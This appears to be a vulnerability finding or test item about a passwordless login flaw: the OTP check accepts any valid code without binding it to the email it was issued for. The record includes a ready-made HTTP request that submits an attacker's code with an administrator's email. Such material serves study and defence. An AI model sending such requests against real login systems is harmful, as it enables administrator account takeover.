diagnosis: The OTP handler checks if payload.otp_code exists in Redis as a valid key, but does not verify that the OTP was generated for payload.destination_email. If an attacker requests an OTP for their own email and obtains the valid code, they can submit that code along with an administrator's email to log in as the administrator.
exploit_request:
POST /auth/passwordless/verify-otp HTTP/1.1
Host: portal.login.com
Content-Type: application/json

{"otp_code": "849102", "destination_email": "admin@platform.com"}
